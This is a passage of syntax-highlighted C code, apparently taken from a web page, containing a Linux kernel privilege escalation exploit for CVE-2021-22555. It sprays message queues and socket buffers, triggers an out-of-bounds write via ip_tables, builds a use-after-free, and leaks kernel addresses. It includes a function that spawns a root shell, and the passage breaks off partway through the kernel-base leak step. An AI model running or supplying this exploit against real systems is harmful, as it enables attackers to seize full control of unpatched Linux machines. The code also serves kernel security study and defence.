user_cs, user_ss, user_sp, user_eflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, esp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_eflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigerOutOfBoundWrite</span><span class="params">(<span class="type">int</span> socket_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span></span><br><span class="line">        <span class="type">char</span> pad[<span class="number">0x108</span> + PRIMARY_MSG_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span></span><br><span class="line">    &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    data.replace.num_counters = <span class="number">1</span>;</span><br><span class="line">    data.replace.num_entries = <span class="number">1</span>;</span><br><span class="line">    data.replace.size = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    </span><br><span class="line">    data.entry.next_offset = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    data.entry.target_offset = </span><br><span class="line">            <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    </span><br><span class="line">    data.match.u.user.match_size = <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.match.u.user.name, <span class="string">&quot;icmp&quot;</span>);</span><br><span class="line">    data.match.u.user.revision = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    data.target.u.user.target_size = <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.target.u.user.name, <span class="string">&quot;NFQUEUE&quot;</span>);</span><br><span class="line">    data.target.u.user.revision = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// partial overwrite the next object</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="keyword">sizeof</span>(data)))</span><br><span class="line">        <span class="keyword">if</span> (errno == ENOPROTOOPT)</span><br><span class="line">            errExit(<span class="string">&quot;ip_tables module is not loaded!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         socket_fd;</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ident namespace</span></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket to trigert off-by-null</span></span><br><span class="line">    <span class="keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create socket!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create hole in primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger off-by-null on primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);</span><br><span class="line">    trigerOutOfBoundWrite(socket_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the queues that have the same secondary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);</span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">1024</span>) == <span class="number">0</span>)  <span class="comment">// the hole</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error qid: %d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, </span><br><span class="line">            victim_qid, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release and re-spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="comment">// so that we can make an arbitrary read on a primary msg_msg</span></span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="keyword">sizeof</span>(oob_msg.mtext), </span><br><span class="line">            nearby_msg-&gt;m_list.prev - <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cal the addr of UAF obj by the header we just read out</span></span><br><span class="line">    nearby_msg_prim = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="number">0x400</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n&quot;</span>, </span><br><span class="line">            nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.IV</span></span><br><span class="line"><span class="comment">     * fix the header of UAF obj and release it</span></span><br><span class="line"><span class="comment">     * spray pipe_buffer and leak the kernel base</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// re-construct the msg_msg to fix it</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (freeSkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            victim_addr + <span class="number">0x800</span>, victim_addr + <span class="number">0x800</span>, <span class="comment">// a valid kheap addr is valid</span></span><br><span class="line">            VICTIM_MSG_TYPE, 